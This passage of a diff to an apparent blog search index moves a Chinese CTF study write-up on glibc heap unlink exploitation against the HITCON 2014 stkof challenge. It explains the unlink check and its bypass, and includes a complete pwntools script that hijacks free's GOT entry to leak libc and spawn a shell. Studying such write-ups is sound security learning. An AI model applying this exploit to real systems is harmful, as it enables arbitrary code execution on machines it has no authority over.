class="hljs-comment">#修改chunk1的操作，就会从0x602148取指针（free_got）然后就可以把free的got表地址修改为put_got的地址 </span><br>free(<span class="hljs-number">2</span>)<br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&quot;\nOK\n&quot;</span>,drop = <span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>puts_offset = libc.symbols[<span class="hljs-string">&quot;puts&quot;</span>]<br>system_offset = libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>binp_offset = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br> <br>libc_base = puts_addr - puts_offset<br> <br>system_addr = libc_base + system_offset<br> <br>payload4 = p64(system_addr)<br><br>edit(<span class="hljs-number">1</span>,payload4)<br><span class="hljs-comment">#再次修改chunk1，把free_got修改为system的地址</span><br><br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;/bin/sh\00&quot;</span>)<br>free(<span class="hljs-number">4</span>)<br> <br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>PWN学习</category>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>PWN学习</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>upload-labs 学习</title>
     <url>/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="upload-labs-学习"><a class="markdownIt-Anchor" href="#upload-labs-学习"></a> upload-labs 学习</h1>
@@ -909,91 +994,6 @@
       </categories>
       <tags>
         <tag>web学习</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>unlink漏洞学习</title>
-    <url>/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="堆的unlink漏洞学习"><a class="markdownIt-Anchor" href="#堆的unlink漏洞学习"></a> 堆的unlink漏洞学习</h1>
-<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2>
-<p>做实验做到的堆部分，第一个就是这个，以前没怎么详细做过堆的题，理解起来真的困难，看了几天才能理解，还是太菜了。就决定要把这个记录下来TAT</p>
-<h2 id="unlink基本原理"><a class="markdownIt-Anchor" href="#unlink基本原理"></a> Unlink基本原理</h2>
-<p>Unlink的目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下</p>
-<img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/unlink.png" alt="unlink基本原理" style="zoom:67%;">
-<p>目的是为了把图中的P拿出来，然后使FD-&gt;bk=BK 以及BK-&gt;fd=FD，其实这里说的也已经很清楚<a href="https://wiki.x10sec.org/pwn/linux/glibc-heap/unlink-zh/#_2">CTF wiki unlink</a>，不过我就是不明白unlink的一个检查机制</p>
-<p>双向链表指针破坏：前一个块的 fd 和下一个块的 bk 应该指向当前 unlink</p>
-<p>块。当攻击者使用 free -12 和 shellcode 地址覆</p>
-<p>盖 fd 和 bk 时， free 和 shellcode 地址 + 8 就不会指向当前 unlink 块</p>
-<p>（ second ）。因此 glibc malloc 就抛出双向链表指针破坏错误。</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))<br><span class="hljs-built_in">malloc_printerr</span> (check_action, <span class="hljs-string">&quot;corrupted double-linked</span><br><span class="hljs-string">list&quot;</span>, P); <br></code></pre></td></tr></table></figure>
-<p>以及这个机制的绕过，这个机制主要是验证p-&gt; fd-&gt; bk == p 和 p-&gt; bk-&gt; fd == p</p>
-<p>绕过主要是令伪造堆快的fd=这个堆快的指针位置-3*偏移，以及bk=这个堆快的指针位置-2*偏移</p>
-<p>这个看得我真的很绕，一时间理解不能，还是太菜了（还有就是这类题都会有个全局指针？）</p>
-<p>不过做了一道题后理解就很清楚了，果然不能光看。</p>
-<h2 id="2014-hitcon-stkof"><a class="markdownIt-Anchor" href="#2014-hitcon-stkof"></a> 2014 HITCON stkof</h2>
-<p>程序开启了canary和堆栈不可执行保护</p>
-<img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213154332.png" alt="检查" style="zoom:67%;">                       
-<p>程序运行后没有什么显示，但是根据ida查看可以知道，程序有3个功能</p>
-<img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213239564.png" alt="运行" style="zoom:67%;">
-<p>输入1是申请堆块，然后输入大小，这里注意有一个全局变量，每次申请的内存地址都存放在这个全局变量中</p>
- <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213308210.png" alt="输入1的函数" style="zoom:67%;">
-<p>输入2是编辑堆块，先输入目录号，然后输入长度，再输入内容</p>
- <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213349366.png" alt="输入2的函数" style="zoom:67%;">
-<p>输入3是进行free的操作</p>
- <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213416269.png" alt="输入3的操作" style="zoom:67%;">
-<p><strong>注意这里所有操作都是通过全局变量指针s来进行的</strong></p>
-<h3 id="利用思路"><a class="markdownIt-Anchor" href="#利用思路"></a> 利用思路</h3>
-<ol>
-<li>
-<p>首先创建4个堆块，3号堆块必须不是fastbin，不然不会向前合并，然后在2号堆块伪造chunk，令fd=chunk2的全局变量指针-0x18，bk= chunk2的全局变量指针-0x10</p>
-</li>
-<li>
-<p>在第二个堆块中伪造fake chunk，然后free第三个堆块进行unlink，unlink操作会把伪造堆块的fd写入原来全局变量的chunk2的指针处。</p>
-</li>
-<li>
-<p>这时候修改chunk2，因为chunk2的指针是就等于修改chunk2的全局变量指针-0x18处的值。</p>
-</li>
-<li>
-<p>编辑chunk2（也就是chunk2的全局变量指针-0x18）开始编辑，把free的got表覆盖全局变量的chunk1指针处，然后通过编辑功能修改chunk1指针（也就是free的got表）为put的plt表，然后free掉chunk2，就可以泄露处put的真实地址，然后计算system和bin/sh的真实地址</p>
-</li>
-<li>
-<p>最后把free的got表覆盖为system的地址，然后编辑chunk4中为/bin/sh的地址，然后free掉chunk4，触发system（/bin/sh）即可完成利用</p>
-</li>
-</ol>
-<h3 id="攻击过程"><a class="markdownIt-Anchor" href="#攻击过程"></a> 攻击过程</h3>
-<p>首先创建4个堆块，大小分别为0x20，0x30，0x80，0x20，堆块3不能是fastbin，否则不能触发合并。</p>
- <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213459651.png" alt="创建堆快" style="zoom:67%;">
-<p>查看全局变量s的位置，4个堆块的指针都记录在上面</p>
- <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213531336.png" alt="全局变量查看" style="zoom:67%;">
-<p>然后修改chunk2伪造堆块</p>
- <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213556648.png" alt="伪造的chunk2" style="zoom:67%;">
-<p>0是伪造堆块的prev_size，0x30是size</p>
-<p>0x602138是chunk2的全局变量指针-0x10(这里是0x612150-0x18)在伪造堆块的fd位置</p>
-<p>0x602140是chunk2的全局变量指针-0x10(这里是0x612150-0x18)在位置堆块的bk位置</p>
-<p>然后覆盖chunk3的prev_size为0x30，size为0x90，让系统以为伪造的堆块处于空闲状态</p>
-<p>进行free（3）的操作后，判断伪造的chunk2是处于空闲状态，然后判断</p>
-<p>p-&gt; fd-&gt; bk = = p 和 p-&gt; bk-&gt; fd ==p，这里p-&gt; fd=0x602138，然后从0x602138取4个地址偏移的位置（看成一个0x602138起始的堆块取bk），刚刚好是全局指针0x602150=&gt;0x2846460=p，验证通过，然后p-&gt; bk-&gt; fd ==p的过程同上。</p>
-<p>然后进行unlink操作</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++">FD = p-&gt;fd;<br>BK = p-&gt;bk;<br>FD-&gt;bk = BK;<br>BK-&gt;fd = FD;<br></code></pre></td></tr></table></figure>
-<p>这里FD-&gt;bk和BK-&gt;fd都是chunk2在全局变量指针中的地址，最后会进行BK-&gt;fd = FD，把伪造chunk2的FD复制到chunk2全局变量指针的位置，结果如下</p>
- <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213704244.png" alt="最后进行的BK->fd操作" style="zoom:67%;">
-<p>可以看到0x602150（原来chunk2的指针位置）被覆盖成了伪造chunk2的FD（0x602138）</p>
-<p>然后进行修改chunk2的操作（先从全局变量取指针0x602150-&gt;0x602138），然后就可以修改0x602138的位置的内容，这时把chunk1的全局变量指针改为free的got表地址，chunk2的全局变量指针改为put的plt表地址（用于put出put函数真实地址）</p>
- <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213750481.png" alt="编辑chunk1" style="zoom:67%;">
-<p>这里0x602148和0x602150已经被修改为free_got和put_plt</p>
-<p>然后进行修改chunk1的操作，就会从0x602148取指针（free_got）然后就可以把free的got表地址修改为put_got的地址</p>
-<p>进行free（2）的操作，实际上是put出put_plt泄露出真实地址</p>
- <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213836064.png" alt="泄露的put真实地址" style="zoom:67%;">
-<p>后续操作就是计算system已经/bin/sh的地址了，最后同上修改free的got表地址为system的地址，修改chunk4为/bin/sh，进行free（4）的操作就可以了。</p>
-<p>脚本如下，参考了https://bbs.pediy.com/thread-247007.htm</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br> <br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br> <br>context(log_level = <span class="hljs-string">&quot;debug&quot;</span>,os = <span class="hljs-string">&quot;linux&quot;</span>)<br><br>p = process(<span class="hljs-string">&quot;./stkof&quot;</span>)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">malloc</span>(<span class="hljs-params">size</span>):</span><br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,strings</span>):</span><br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(strings)))<br>    p.send(strings)<br>    p.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br> <br>malloc(<span class="hljs-number">0x20</span>)<br>malloc(<span class="hljs-number">0x30</span>)<br>malloc(<span class="hljs-number">0x80</span>)<br>malloc(<span class="hljs-number">0x20</span>)<br><span class="hljs-comment">#创建4个堆快，第三个用来free的堆快不能是fastbin</span><br><br>target = <span class="hljs-number">0x602140</span> + <span class="hljs-number">0x10</span><br>fd = target - <span class="hljs-number">0x18</span><br>bk = target - <span class="hljs-number">0x10</span><br><br>payload = p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#伪造堆块的prev_size</span><br>payload += p64(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#伪造堆块的size</span><br>payload += p64(fd) + p64(bk)<br>payload += <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span><br>payload += p64(<span class="hljs-number">0x30</span>) + p64(<span class="hljs-number">0x90</span>)  <span class="hljs-comment">#更改chunk3的标志位，会认为前一个堆快是空闲的触发unlink</span><br>edit(<span class="hljs-number">2</span>,payload)<br><br>free(<span class="hljs-number">3</span>)<br>p.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;./stkof&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br> <br>free_got = elf.got[<span class="hljs-string">&quot;free&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>payload2 = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span> <br>payload2 += p64(free_got) + p64(puts_got)<br>edit(<span class="hljs-number">2</span>,payload2)<br><br>payload3 = p64(puts_plt)<br>edit(<span class="hljs-number">1</span>,payload3)<br><span class="hljs-comment">#修改chunk1的操作，就会从0x602148取指针（free_got）然后就可以把free的got表地址修改为put_got的地址 </span><br>free(<span class="hljs-number">2</span>)<br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&quot;\nOK\n&quot;</span>,drop = <span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>puts_offset = libc.symbols[<span class="hljs-string">&quot;puts&quot;</span>]<br>system_offset = libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>binp_offset = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br> <br>libc_base = puts_addr - puts_offset<br> <br>system_addr = libc_base + system_offset<br> <br>payload4 = p64(system_addr)<br><br>edit(<span class="hljs-number">1</span>,payload4)<br><span class="hljs-comment">#再次修改chunk1，把free_got修改为system的地址</span><br><br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;/bin/sh\00&quot;</span>)<br>free(<span class="hljs-number">4</span>)<br> <br>p.interactive()<br><br></code></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>PWN学习</category>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>PWN学习</tag>
       </tags>
   </entry>
   <entry>
